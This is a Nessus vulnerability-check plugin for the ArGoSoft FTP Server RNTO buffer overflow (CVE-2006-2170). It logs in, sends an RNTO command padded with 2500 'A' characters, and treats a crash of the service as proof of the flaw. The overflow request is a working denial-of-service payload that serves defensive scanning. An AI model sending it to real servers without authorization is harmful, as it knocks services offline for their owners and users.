#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(21326);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2006-2170");
  script_bugtraq_id(17789);
  script_osvdb_id(25216);
 
  script_name(english:"ArGoSoft FTP Server RNTO Command Remote Buffer Overflow");
  script_summary(english:"Checks for RNTO command buffer overflow vulnerability in ArGoSoft FTP Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is using ArGoSoft FTP Server, an FTP server for
Windows. 

The version of ArGoSoft FTP Server installed on the remote host
contains a buffer overflow vulnerability that can be exploited by an
authenticated, but possibly anonymous, user with a specially crafted
RNTO command to crash the affected application or execute arbitrary
code on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2006/May/22" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/05/04");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/05/01");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);


# Make sure it's ArGoSoft.
banner = get_ftp_banner(port:port);
if (!banner || "ArGoSoft" >!< banner) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item_or_exit("ftp/password");


soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Try to exploit the flaw to crash the daemon.
#
# nb: the file doesn't need to exist.
c = string("RNFR ", SCRIPT_NAME, "-", unixtime());
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if (s && "350 Requested file action" >< s)
{
  c = string("RNTO ", crap(data:"A", length:2500));
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  close(soc);

  # If we didn't get a response...
  if (!s)
  {
    tries = 5;
    for (iter = 0; iter < tries; iter++)
    {
      # Check whether it's truly down.
      soc2 = open_sock_tcp(port);
      if (soc2)
      {
        s = ftp_recv_line(socket:soc2);
        close(soc2);
        sleep(1);
      }
      else
      {
        security_warning(port); 
        exit(0);
      }
    }
  }
}
